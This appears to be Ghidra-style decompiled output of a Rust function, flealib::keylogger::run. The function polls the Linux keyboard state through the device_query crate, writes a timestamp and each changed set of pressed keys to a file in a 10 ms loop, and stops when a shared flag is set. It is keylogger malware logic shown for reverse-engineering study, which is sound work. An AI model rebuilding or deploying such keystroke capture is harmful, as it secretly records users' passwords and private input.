void _ZN7flealib9keylogger3run17h87b81c5530122ddaE(undefined4 *param_1,long param_2)

{
  undefined *puVar1;
  undefined8 **ppuVar2;
  char cVar3;
  undefined8 uVar4;
  long lVar5;
  ulong uVar6;
  undefined auVar7 [16];
  int local_12c;
  undefined8 local_128;
  undefined8 uStack_120;
  undefined8 **local_118;
  long local_108;
  undefined8 local_100;
  undefined8 local_f8;
  undefined8 uStack_f0;
  undefined8 **local_e8;
  undefined8 local_e0;
  ulong local_d8;
  undefined8 *local_c8;
  code *local_c0;
  undefined4 *local_b0;
  undefined8 local_a8;
  undefined8 uStack_a0;
  undefined8 **local_98;
  undefined8 local_90;
  undefined8 local_88;
  undefined8 **local_50;
  code *local_48;
  undefined local_40 [16];
  
  local_108 = param_2;
  local_b0 = param_1;
                    /* try { // try from 004a35dc to 004a35e9 has its CatchHandler @ 004a38e3 */
  local_100 = (*(code *)
                PTR__ZN12device_query12device_state5linux11DeviceState3new17h85eaeab3eb11e402E_00828898
              )();
  local_128 = 0;
  uStack_120 = 1;
  local_118 = (undefined8 ***)0x0;
  local_f8 = (undefined **)0x1b600000000;
  uStack_f0 = (ulong)uStack_f0._6_2_ << 0x30;
  uStack_f0 = CONCAT35(uStack_f0._5_3_,0x100000000);
  uStack_f0 = CONCAT53(uStack_f0._3_5_,0x10000);
  local_98 = *(undefined8 ***)(param_1 + 4);
  local_a8._0_4_ = *param_1;
  local_a8._4_4_ = param_1[1];
  uStack_a0._0_4_ = param_1[2];
  uStack_a0._4_4_ = param_1[3];
                    /* try { // try from 004a3649 to 004a3669 has its CatchHandler @ 004a3909 */
  _ZN3std2fs11OpenOptions4open17h8371f65deb3b5c6cE(&local_c8,&local_f8,&local_a8);
  local_12c = _ZN4core6result19Result_LT_T_C_E_GT_6expect17haa955ffa68429013E(&local_c8);
                    /* try { // try from 004a366e to 004a36c1 has its CatchHandler @ 004a390e */
  (*(code *)PTR__ZN6chrono6offset5local5Local3now17hca9c0f908c2b914dE_008288a0)(local_40);
  local_f8 = (undefined **)&DAT_0016ee2d;
  uStack_f0 = 0x11;
  local_e8 = (undefined8 **)0x8;
  local_e0 = 0;
  local_d8 = local_d8 & 0xffffffffffffff00;
  _ZN6chrono8datetime18DateTime_LT_Tz_GT_17format_with_items17h5a76f879a559b27aE
            (&local_a8,local_40,&local_f8);
                    /* try { // try from 004a36c2 to 004a36d6 has its CatchHandler @ 004a38e8 */
  _ZN49__LT_T_u20_as_u20_alloc__string__SpecToString_GT_14spec_to_string17h20ea0768b3eb5f09E
            (&local_c8,&local_a8);
  local_48 = _ZN58__LT_alloc__string__String_u20_as_u20_core__fmt__Debug_GT_3fmt17h1887dc6ebeddb523E
  ;
  local_f8 = &PTR_DAT_0080b9b0;
  uStack_f0 = 2;
  local_d8 = 0;
  local_e8 = &local_50;
  local_e0 = 1;
                    /* try { // try from 004a3722 to 004a3742 has its CatchHandler @ 004a38ed */
  local_50 = &local_c8;
  uVar4 = _ZN3std2io5Write9write_fmt17hdf334e0e7fdeaff7E(&local_12c,&local_f8);
  _ZN4core6result19Result_LT_T_C_E_GT_6expect17h97b316d058ec8231E(uVar4,&PTR_DAT_0080b9e8);
                    /* try { // try from 004a3743 to 004a374c has its CatchHandler @ 004a38e8 */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17hd935b2ddfd513885E(&local_c8);
                    /* try { // try from 004a374d to 004a3759 has its CatchHandler @ 004a390e */
  _ZN4core3ptr109drop_in_place_LT_chrono__format__formatting__DelayedFormat_LT_chrono__format__strftime__StrftimeItems_GT__GT_17h35c450be2a355fffE
            (&local_a8);
  puVar1 = PTR__ZN3std6thread5sleep17h1a6eeffe1c923e1fE_00828810;
  while( true ) {
                    /* try { // try from 004a3770 to 004a377d has its CatchHandler @ 004a392f */
    (*(code *)
      PTR__ZN106__LT_device_query__device_state__linux__DeviceState_u20_as_u20_device_query__device_query__DeviceQuery_GT_8get_keys17hb2c15ef766e541d3E_008288a8
    )(&local_f8,&local_100);
    ppuVar2 = local_e8;
    uVar4 = uStack_f0;
    auVar7 = _ZN81__LT_alloc__vec__Vec_LT_T_C_A_GT__u20_as_u20_core__ops__index__Index_LT_I_GT__GT_5index17h124ad9b75a483d4dE
                       (uStack_120,local_118);
                    /* try { // try from 004a379a to 004a3820 has its CatchHandler @ 004a3931 */
    cVar3 = _ZN73__LT__u5b_A_u5d__u20_as_u20_core__slice__cmp__SlicePartialEq_LT_B_GT__GT_5equal17ha62555823fa75279E
                      (uVar4,ppuVar2,auVar7._0_8_,auVar7._8_8_);
    if ((cVar3 == '\0') && ((undefined8 ***)local_e8 != (undefined8 ***)0x0)) {
      local_c0 = 
      _ZN65__LT_alloc__vec__Vec_LT_T_C_A_GT__u20_as_u20_core__fmt__Debug_GT_3fmt17h87d7b420a6ce0922E
      ;
      local_a8 = &DAT_0014fb30;
      uStack_a0 = 1;
      local_88 = 0;
      local_98 = &local_c8;
      local_90 = 1;
      local_c8 = &local_f8;
      uVar4 = _ZN3std2io5Write9write_fmt17hdf334e0e7fdeaff7E(&local_12c,&local_a8);
      _ZN4core6result19Result_LT_T_C_E_GT_6expect17h97b316d058ec8231E(uVar4,&PTR_DAT_0080ba00);
    }
    local_98 = local_e8;
    local_a8._0_4_ = SUB84(local_f8,0);
    local_a8._4_4_ = local_f8._4_4_;
    uStack_a0._0_4_ = (undefined4)uStack_f0;
    uStack_a0._4_4_ = uStack_f0._4_4_;
                    /* try { // try from 004a383b to 004a3842 has its CatchHandler @ 004a3910 */
    _ZN4core3ptr73drop_in_place_LT_alloc__vec__Vec_LT_device_query__keymap__Keycode_GT__GT_17h105afaa7bb6ce9fcE
              (&local_128);
    local_118 = local_98;
    local_128 = CONCAT44(local_a8._4_4_,(undefined4)local_a8);
    uStack_120 = CONCAT44(uStack_a0._4_4_,(undefined4)uStack_a0);
                    /* try { // try from 004a3866 to 004a3893 has its CatchHandler @ 004a3940 */
    _ZN3std4sync5mutex14Mutex_LT_T_GT_4lock17hc1a133ff57aa1c3eE(&local_a8,local_108 + 0x10);
    auVar7 = _ZN4core6result19Result_LT_T_C_E_GT_6unwrap17h46532edc52e964b3E(&local_a8);
    lVar5 = auVar7._0_8_;
    uVar6 = auVar7._8_8_ & 1;
    if (*(char *)(lVar5 + 5) != '\0') break;
    _ZN4core3ptr86drop_in_place_LT_std__sync__mutex__MutexGuard_LT_flealib__keylogger__Keylogger_GT__GT_17hc1ba6f9969cba242E
              (lVar5,uVar6);
    (*(code *)puVar1)(0,10000000);
  }
                    /* try { // try from 004a3899 to 004a38a0 has its CatchHandler @ 004a38e1 */
  _ZN4core3ptr86drop_in_place_LT_std__sync__mutex__MutexGuard_LT_flealib__keylogger__Keylogger_GT__GT_17hc1ba6f9969cba242E
            (lVar5,uVar6,auVar7._8_8_ & 0xffffffffffffff01);
  _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17h427eb749d8d610e5E(local_12c);
                    /* try { // try from 004a38aa to 004a38b3 has its CatchHandler @ 004a38dc */
  _ZN4core3ptr73drop_in_place_LT_alloc__vec__Vec_LT_device_query__keymap__Keycode_GT__GT_17h105afaa7bb6ce9fcE
            (&local_128);
                    /* try { // try from 004a38b6 to 004a38bf has its CatchHandler @ 004a38e3 */
  _ZN4core3ptr67drop_in_place_LT_device_query__device_state__linux__DeviceState_GT_17h084f2ce93c8b7089E
            (&local_100);
  _ZN4core3ptr105drop_in_place_LT_alloc__sync__Arc_LT_std__sync__mutex__Mutex_LT_flealib__keylogger__Keylogger_GT__GT__GT_17h218e3e30bfeebf8aE
            (&local_108);
  return;
}